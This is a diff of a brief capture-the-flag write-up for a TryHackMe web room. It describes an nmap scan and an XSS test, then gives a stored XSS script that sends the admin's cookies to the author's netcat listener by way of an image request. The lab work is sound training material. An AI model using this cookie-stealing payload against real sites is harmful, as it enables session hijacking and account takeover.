@@ -1,6 +1,6 @@
 Link: https://tryhackme.com/room/marketplace
 
-This pentest is mainly based in web app security, so I first open website and burp, I run nmap in background but its only 22 and 80 open. I also run 
+This pentest is mainly based in web app security, so I first open website and burp, I run nmap in background but its only 22 and 80 open.
 I registered to this website and login, then I tried to find some input field that I could test XSS, and there we go, basic payload <scipt>alert(1)</script> prove that XSS exist.
 What we can do with it? There is option send a bug to admin, so we can send him script that will send his cookies to us, I used this script and run netcat listener on port 6666
 <script>new Image().src="http://10.9.91.255:6666/random.php?output="+document.cookie;</script>
